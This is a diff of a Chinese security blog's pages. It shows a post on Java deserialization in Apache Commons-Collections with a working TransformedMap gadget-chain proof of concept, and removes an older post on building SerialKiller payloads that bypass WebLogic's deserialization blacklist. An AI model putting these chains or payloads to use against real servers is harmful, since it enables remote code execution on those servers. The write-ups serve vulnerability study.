@@ -79,16 +79,17 @@
 
 
 
-<meta name="description" content="学习经历">
-<meta property="og:type" content="website">
+<meta name="description" content="Java反序列化之Commons-CollectionsApache Commons-Collections 简介Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的">
+<meta property="og:type" content="article">
 <meta property="og:title" content="BadGSD">
-<meta property="og:url" content="https://badgsd.github.io/index.html">
+<meta property="og:url" content="https://badgsd.github.io/2018/04/17/Java反序列化纸Commons-Collections/index.html">
 <meta property="og:site_name" content="BadGSD">
-<meta property="og:description" content="学习经历">
+<meta property="og:description" content="Java反序列化之Commons-CollectionsApache Commons-Collections 简介Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-04-17T11:10:36.940Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BadGSD">
-<meta name="twitter:description" content="学习经历">
+<meta name="twitter:description" content="Java反序列化之Commons-CollectionsApache Commons-Collections 简介Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开">
 
 
 
@@ -118,13 +119,13 @@
 
 
 
-  <link rel="canonical" href="https://badgsd.github.io/"/>
+  <link rel="canonical" href="https://badgsd.github.io/2018/04/17/Java反序列化纸Commons-Collections/"/>
 
 
 
 
 
-  <title>BadGSD</title>
+  <title> | BadGSD</title>
   
 
 
@@ -143,8 +144,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -217,9 +217,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -249,9 +249,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/04/17/Java反序列化纸Commons-Collections/" itemprop="url">未命名</a></h1>
+          <h1 class="post-title" itemprop="name headline"></h1>
         
 
         <div class="post-meta">
@@ -301,9 +299,7 @@
       
 
       
-        
-          
-            <h2 id="Java反序列化之Commons-Collections"><a href="#Java反序列化之Commons-Collections" class="headerlink" title="Java反序列化之Commons-Collections"></a>Java反序列化之Commons-Collections</h2><h4 id="Apache-Commons-Collections-简介"><a href="#Apache-Commons-Collections-简介" class="headerlink" title="Apache Commons-Collections 简介"></a>Apache Commons-Collections 简介</h4><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。</p>
+        <h2 id="Java反序列化之Commons-Collections"><a href="#Java反序列化之Commons-Collections" class="headerlink" title="Java反序列化之Commons-Collections"></a>Java反序列化之Commons-Collections</h2><h4 id="Apache-Commons-Collections-简介"><a href="#Apache-Commons-Collections-简介" class="headerlink" title="Apache Commons-Collections 简介"></a>Apache Commons-Collections 简介</h4><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。</p>
 <p>一些Java应用程序(Weblogic，Websphere，Jboss，Jenkins，Coldfusion等)的RCE漏洞都是因为Commons-Collections的反序列化造成的。</p>
 <h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Apache Commons Collections 中提供 了一个Transformer的类，这个接口的功能就是将一个对象转换为另外一个对象。</p>
 <p>首先关注一下几个重要的类：</p>
@@ -364,8 +360,6 @@
 <p>可以注意到 <code>memberValue</code> 是 <code>AnnotationInvocationHandler</code> 类中类型声明为 <code>Map&lt;String, Object&gt;</code> 的成员变量，刚好和之前构造的 <code>TransformedMap</code> 类型相符，因此我们可以通过 Java 的反射机制动态的获取 <code>AnnotationInvocationHandler</code> 类，使用精心构造好的 <code>TransformedMap</code> 作为它的实例化参数，然后将实例化的 <code>AnnotationInvocationHandler</code> 进行序列化得到二进制数据，最后传递给具有相应环境的序列化数据交互接口使之触发命令执行的 Gadget。利用测试代码如下：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollectionPayload</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Runtime.getRuntime().exec("calc");</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123; String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"calc"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map inMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        inMap.put(<span class="string">"key"</span>, <span class="string">"value"</span>);</span><br><span class="line">        Map outMap = TransformedMap.decorate(inMap, <span class="keyword">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class cls = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cls.getDeclaredConstructor(<span class="keyword">new</span> Class[] &#123; Class.class, Map.class &#125;);</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object instance = ctor.newInstance(<span class="keyword">new</span> Object[] &#123; Retention.class, outMap &#125;);</span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.ser"</span>);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(instance);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.ser"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        <span class="comment">// 触发代码执行</span></span><br><span class="line">        Object newObj = ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-          
-        
       
     </div>
     
@@ -382,178 +376,28 @@
       
 
       
-
-      
-
       
       
-        <div class="post-eof"></div>
+
       
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://badgsd.github.io/2018/03/14/记-SerialKillerBypassGadgetCollection-编译过程/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="BadGSD">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="BadGSD">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/03/14/记-SerialKillerBypassGadgetCollection-编译过程/" itemprop="url">记 SerialKillerBypassGadgetCollection 编译过程</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
             
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-14T17:36:01+08:00">
-                2018-03-14
-              </time>
+              <a href="/2018/03/14/记-SerialKillerBypassGadgetCollection-编译过程/" rel="next" title="记 SerialKillerBypassGadgetCollection 编译过程">
+                <i class="fa fa-chevron-left"></i> 记 SerialKillerBypassGadgetCollection 编译过程
+              </a>
             
+          </div>
 
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
             
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+          </div>
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          
-            <h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>  想要生成 Weblogic Deserialization RCE(CVE-2016-3510) 的payload，利用<code>weblogic.corba.utils.MarshallObject</code>的反序列化来绕过 Weblogic 的黑名单，从而执行恶意代码。</p>
-<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>  SerialKiller 是一个用来绕过可预见的<code>ObjectInputStreams</code>防御反序列化措施，生成用于Java反序列化的 Gadget chains 的工具的集合。</p>
-<h3 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h3><p><code>https://github.com/pwntester/SerialKillerBypassGadgetCollection</code></p>
-<h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><p>  从 Requirements 中可以看到所需要的依赖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ysoserial-0.0.5-SNAPSHOT-all.jar</span><br><span class="line">com.ibm.jaxws.thinclient_8.5.0.jar</span><br><span class="line">com.ibm.ws.ejb.embeddableContainer_8.5.0.jar</span><br><span class="line">com.oracle.weblogic.iiop-common.jar</span><br><span class="line">com.ibm.mq.jmqi.jar</span><br><span class="line">com.ibm.ws.ejb.thinclient_8.5.0.jar</span><br><span class="line">com.ibm.msg.client.jms.jar</span><br><span class="line">com.ibm.ws.runtime.coregroupbridge.jar</span><br></pre></td></tr></table></figure></p>
-<p>先解决上面的所需依赖。</p>
-<ol>
-<li><code>ysoserial-0.0.5-SNAPSHOT-all.jar</code><ul>
-<li>这个去<a href="https://github.com/frohoff/ysoserial/releases" target="_blank" rel="noopener">ysoserial</a>这里下载就可以了。如果下载的是其他版本的，要在<code>pom.xml</code>中改成对应版本。</li>
-</ul>
-</li>
-<li><code>com.oracle.weblogic.iiop-common.jar</code><ul>
-<li>这个是 Weblogic 里面的一个包，在本地安装的 Weblogic 中没有找到这个包，倒是在 GitHub 中搜到了，<a href="https://raw.githubusercontent.com/shainaBajaj/BitsProject/master/medrec_project/test/Oracle/Middleware/Oracle_Home/wlserver/modules/com.oracle.weblogic.iiop-common.jar" target="_blank" rel="noopener">下载地址</a></li>
-</ul>
-</li>
-<li><p><code>com.ibm.*</code></p>
-<ul>
-<li><p>这些包都是 Websphere 里面的。从 Docker Hub 中下载 Webspher。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull amanly/websphere_8_5_5</span><br></pre></td></tr></table></figure>
-<p>启动之后，进入容器内部，将上面的包一个一个找出来就行。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;com.ibm.jaxws.thinclient_8.5.0.jar&quot;</span><br></pre></td></tr></table></figure>
-<p>将6个包打包，在外部下载出来。</p>
-</li>
-</ul>
-</li>
-</ol>
-<p>除了上述依赖，在编译过程中，还遇到到缺失以下几个依赖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">commons-scxml2-2.0-SNAPSHOT.jar</span><br><span class="line">jai_core-1.1.3.jar</span><br></pre></td></tr></table></figure></p>
-<ol>
-<li><code>commons-scxml2-2.0-SNAPSHOT.jar</code> <ul>
-<li>百度搜一下，<a href="http://pan.baidu.com/s/1bnsjHWN" target="_blank" rel="noopener">下载地址</a></li>
-</ul>
-</li>
-<li><code>jai_core-1.1.3.jar</code><ul>
-<li>这个包是因为在 Maven 源上被删除了。谷歌一下，<a href="http://download.osgeo.org/webdav/geotools/javax/media/jai_core/1.1.3/" target="_blank" rel="noopener">下载地址</a>,下面还要修改<code>pom.xml</code>。</li>
-</ul>
-</li>
-</ol>
-<p>到此，所以的依赖都已经准备好了，在项目根目录中，新建<code>external</code>文件夹，将上面的10个包放进文件夹中。</p>
-<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>先解决<code>jai_core</code>依赖问题，修改<code>pom.xml</code>，在<code>maven-install-plugin</code>加一个<code>execution</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;execution&gt;</span><br><span class="line">    &lt;id&gt;install-jai&lt;/id&gt;</span><br><span class="line">    &lt;phase&gt;clean&lt;/phase&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">        &lt;file&gt;$&#123;basedir&#125;/external/jai_core-1.1.3.jar&lt;/file&gt;</span><br><span class="line">        &lt;repositoryLayout&gt;default&lt;/repositoryLayout&gt;</span><br><span class="line">        &lt;groupId&gt;javax.media&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jai_core&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.1.3&lt;/version&gt;</span><br><span class="line">        &lt;packaging&gt;jar&lt;/packaging&gt;</span><br><span class="line">        &lt;generatePom&gt;true&lt;/generatePom&gt;</span><br><span class="line">    &lt;/configuration&gt;</span><br><span class="line">    &lt;goals&gt;</span><br><span class="line">        &lt;goal&gt;install-file&lt;/goal&gt;</span><br><span class="line">    &lt;/goals&gt;</span><br><span class="line">&lt;/execution&gt;</span><br></pre></td></tr></table></figure></p>
-<p>然后将本地的 jar 包添加到本地的仓库里<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean</span><br></pre></td></tr></table></figure></p>
-<p>执行完之后，可以看到本地的 jar 包已经添加到本地仓库里面了，可以调用了。<br><img src="/images/5.png" alt=""></p>
-<p>最后执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean compile assembly:single</span><br></pre></td></tr></table></figure></p>
-<p>重新编译，发现依赖问题解决了，可以引用了，但是代码又出错了。提示<code>ysoserial.GeneratePayload</code>不存在<code>ToStringComparator</code>方法。<br><img src="/images/1.png" alt=""></p>
-<p>对 Java 不熟啊，没法改，还好这是个输出用法函数，索性直接注释了。。<br><img src="/images/2.png" alt=""></p>
-<p>再次编译<br><img src="/images/3.png" alt=""></p>
-<p>终于成功了….撒花</p>
-<h3 id="payload-测试"><a href="#payload-测试" class="headerlink" title="payload 测试"></a>payload 测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar target/serialkiller-bypass-gadgets-0.0.1-SNAPSHOT-all.jar CommonsCollections1  Weblogic1 &quot;calc&quot; &gt; calc</span><br></pre></td></tr></table></figure>
-<p>用脚本将生成的 payload 发送过去，成功在打了CVE-2015-4852补丁的 Weblogic 上弹出计算器。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -563,10 +407,11 @@
   </article>
 
 
-    
-  </section>
 
-  
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -574,6 +419,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -594,8 +443,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -639,6 +497,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Java反序列化之Commons-Collections"><span class="nav-number">1.</span> <span class="nav-text">Java反序列化之Commons-Collections</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Apache-Commons-Collections-简介"><span class="nav-number">1.0.1.</span> <span class="nav-text">Apache Commons-Collections 简介</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞原理"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#TransformedMap"><span class="nav-number">1.1.1.</span> <span class="nav-text">TransformedMap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#LazyMap"><span class="nav-number">1.1.2.</span> <span class="nav-text">LazyMap</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -772,6 +646,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
 
   
 
